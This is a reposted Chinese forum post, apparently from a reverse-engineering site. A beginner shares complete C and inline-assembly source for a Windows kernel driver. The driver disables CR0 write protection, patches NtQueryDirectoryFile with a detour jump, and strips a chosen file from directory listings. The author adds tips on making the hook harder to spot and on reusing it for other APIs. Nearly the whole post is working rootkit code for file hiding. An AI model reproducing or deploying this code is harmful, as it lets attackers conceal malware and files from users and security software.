
# `inline hook NtQueryDirectoryFile`

> 原文：[`www.pediy.com/kssd/pediy10/64502.html`](https://www.pediy.com/kssd/pediy10/64502.html)

不敢说原创了，因为没什么是我创的![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!") ![](img/e71d9210a215d5b66755d038631e0c83.jpg "恐怖!")

学习了 `Rootkits.Subverting.the.Windows.Kernel` 中的 `detour` 补丁一章和一篇 `kernel inline hook` 的精华写下了下面代码，练练手。

`inline hook NtQueryDirectoryFile` 实现了隐藏文件，代码其实还有很多要改进的地方。`inline hook` 应该还有很多发展的空间，比如我这个代码开头就 `jmp` 了，太明显了，可以改后面的字节再 `jmp`。

好不容易实现了，就赶紧发上来了，给和我一样新手们，改改就可以 `hook` 别的 `api` 了。

代码：



```c
#include "ntddk.h"

typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;

typedef struct _FILE_BOTH_DIR_INFORMATION {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *PFILE_BOTH_DIR_INFORMATION;

NTSYSAPI
NTSTATUS
NTAPI NtQueryDirectoryFile(
  IN  HANDLE FileHandle,
  IN  HANDLE Event OPTIONAL,
  IN  PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN  PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FileInformation,
  IN  ULONG Length,
  IN  FILE_INFORMATION_CLASS FileInformationClass,
  IN  BOOLEAN ReturnSingleEntry,
  IN  PUNICODE_STRING FileName OPTIONAL,
  IN  BOOLEAN RestartScan
  );

NTSTATUS Check();
VOID write();
VOID write_back();

NTSTATUS rc;
////////
ANSI_STRING ansiFileName,ansiDirName,HideDirFile;
UNICODE_STRING uniFileName;
PFILE_BOTH_DIR_INFORMATION currentDirInfo = NULL;
PFILE_BOTH_DIR_INFORMATION lastDirInfo = NULL;
ULONG offset = 0;
ULONG position = 0;
ULONG newLenth = 0;
BOOL hook;
////////
// This is our unload function

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )

{

    DbgPrint("OnUnload called\n");
  if(hook)
  write_back();

}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT theDriverObject,

                     IN PUNICODE_STRING theRegistryPath)

{

    DbgPrint("I loaded!");
  if(NT_SUCCESS(Check()))
  {
    DbgPrint(" check SUCCESS");
    write();
    hook=TRUE;
  }
  else
    DbgPrint(" check UNSUCCESSFUL");
  theDriverObject->DriverUnload  = OnUnload;

  return STATUS_SUCCESS;

}
//检查一下符合不
NTSTATUS Check()
{
  int i=0;
  char *p=(char *)NtQueryDirectoryFile;
  /*
    mov     edi,edi
    push  ebp
    mov    ebp, esp
    lea     eax,[ebp+2Ch]
    push    eax

  */
  char c[]={0x8b,0xff,0x55,0x8b,0xec,0x8d,0x45,0x2c,0x50};
  for(;i<9;i++)
  {
    DbgPrint("-0x%02X",(unsigned char)p[i]);
    if(p[i]!=c[i])
    {
      return STATUS_UNSUCCESSFUL;
    }
  }
  return STATUS_SUCCESS;
}

__declspec(naked) NTAPI MyNtQueryDirectoryFile(IN  HANDLE FileHandle,
  IN  HANDLE Event OPTIONAL,
  IN  PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN  PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FileInformation,
  IN  ULONG Length,
  IN  FILE_INFORMATION_CLASS FileInformationClass,
  IN  BOOLEAN ReturnSingleEntry,
  IN  PUNICODE_STRING FileName OPTIONAL,
  IN  BOOLEAN RestartScan)
{

  __asm 
  {
    push ebp
    mov ebp,esp
    pushad
  }
  //将参数压入
  __asm
  {
    push [ebp+30h]
    push [ebp+2Ch]
    push [ebp+28h]
    push [ebp+24h]
    push [ebp+20h]
    push [ebp+1Ch]
    push [ebp+18h]
    push [ebp+14h]
    push [ebp+10h]
    push [ebp+0Ch]
    push [ebp+08h]
  }

  __asm
  {
    //int 3
    jmp forwArd
    bAck:
  }

  __asm
  {   
    // exec missing instructions
    mov     edi,edi
    push  ebp
    mov    ebp, esp
    lea     eax,[ebp+2Ch]
    push    eax
  }
    // jump to re-entry location in hooked function
    // this gets 'stamped' with the correct address
    // at runtime.
    //
    // we need to hard-code a far jmp, but the assembler
    // that comes with the DDK will not poop this out
    // for us, so we code it manually
    // jmp FAR 0x08:0xAAAAAAAA
  __asm
  {
    _emit 0xEA
    _emit 0xAA
    _emit 0xAA
    _emit 0xAA
    _emit 0xAA
    _emit 0x08
    _emit 0x00
  }
  
  __asm 
  {
    forwArd:
    call bAck
  }

  __asm
  {
    mov rc,eax
  }
  //隐藏文件//////////////////////////
  if(NT_SUCCESS(rc)&&FileInformationClass==FileBothDirectoryInformation)
  {
    currentDirInfo =(PFILE_BOTH_DIR_INFORMATION)FileInformation;
    newLenth = Length;
    RtlInitAnsiString(&HideDirFile,"abc.txt"); 
    do
    {
      offset = currentDirInfo->NextEntryOffset;
      RtlInitUnicodeString(&uniFileName,currentDirInfo->FileName);
      RtlUnicodeStringToAnsiString(&ansiFileName,&uniFileName,TRUE);
      RtlUnicodeStringToAnsiString(&ansiDirName,&uniFileName,TRUE);
      if( RtlCompareMemory(ansiFileName.Buffer,HideDirFile.Buffer,HideDirFile.Length ) == HideDirFile.Length)
      {
        if (0 == offset)
        {
          if (lastDirInfo)
          {
            lastDirInfo->NextEntryOffset = 0;
            newLenth -= Length - position;
          }
          else
          {
            currentDirInfo->NextEntryOffset = 0;
            Length = 0;
            //return rc;
            __asm
            {
              popad
              mov esp,ebp
              pop ebp
              mov eax,rc
              ret 0x2C
            }
          }
        }
        else
        {
          RtlMoveMemory(currentDirInfo, (PUCHAR)currentDirInfo + offset, Length - position - offset);
          newLenth -= offset;
          position += offset;
        }
      }
      else
      {
        position += offset;
        lastDirInfo = currentDirInfo;
        currentDirInfo = (PFILE_BOTH_DIR_INFORMATION)((PUCHAR)currentDirInfo + offset);
      }
    } while (0 != offset);
    Length = newLenth;
  }
  //return rc;
  __asm
  {
    popad
    mov esp,ebp
    pop ebp
    mov eax,rc
    ret 0x2C
  }
}
//写入补丁
VOID write()
{
  char *actual_function=(char *)NtQueryDirectoryFile;
  char *non_paged_memory;
  unsigned long detour_address;
  unsigned long reentry_address;
  int i = 0;

  char newcode[] = { 0xEA, 0x44, 0x33, 0x22, 0x11, 0x08, 0x00, 0x90, 0x90 };

  reentry_address = ((unsigned long)NtQueryDirectoryFile) + 9; 

  non_paged_memory = ExAllocatePool(NonPagedPool,1024);

  for(i=0;i<1024;i++)
  {
    ((unsigned char *)non_paged_memory)[i] = ((unsigned char *)MyNtQueryDirectoryFile)[i];
  }

  detour_address = (unsigned long)non_paged_memory;

  *( (unsigned long *)(&newcode[1]) ) = detour_address;


  for(i=0;i<1024;i++)
  {
    if( (0xAA == ((unsigned char *)non_paged_memory)[i]) &&
      (0xAA == ((unsigned char *)non_paged_memory)[i+1]) &&
      (0xAA == ((unsigned char *)non_paged_memory)[i+2]) &&
      (0xAA == ((unsigned char *)non_paged_memory)[i+3]))
    {
      // we found the address 0xAAAAAAAA
      // stamp it w/ the correct address
      *( (unsigned long *)(&non_paged_memory[i]) ) = reentry_address;
      break;
    }
  }

  __asm
  {
            push eax
            mov  eax, CR0
            and  eax, 0FFFEFFFFh
            mov  CR0, eax
            pop  eax
    }

  for(i=0;i < 9;i++)
  {
    actual_function[i] = newcode[i];
  }

  __asm
    {
            push eax
            mov  eax, CR0
            or   eax, NOT 0FFFEFFFFh
            mov  CR0, eax
            pop  eax
    }
}
//写回
VOID write_back()
{
  char *actual_function=(char *)NtQueryDirectoryFile;
  char c[]={0x8b,0xff,0x55,0x8b,0xec,0x8d,0x45,0x2c,0x50};
  int i;
  __asm
  {
            push eax
            mov  eax, CR0
            and  eax, 0FFFEFFFFh
            mov  CR0, eax
            pop  eax
    }

  for(i=0;i < 9;i++)
  {
    actual_function[i] = c[i];
  }

  __asm
    {
            push eax
            mov  eax, CR0
            or   eax, NOT 0FFFEFFFFh
            mov  CR0, eax
            pop  eax
  }
}
```
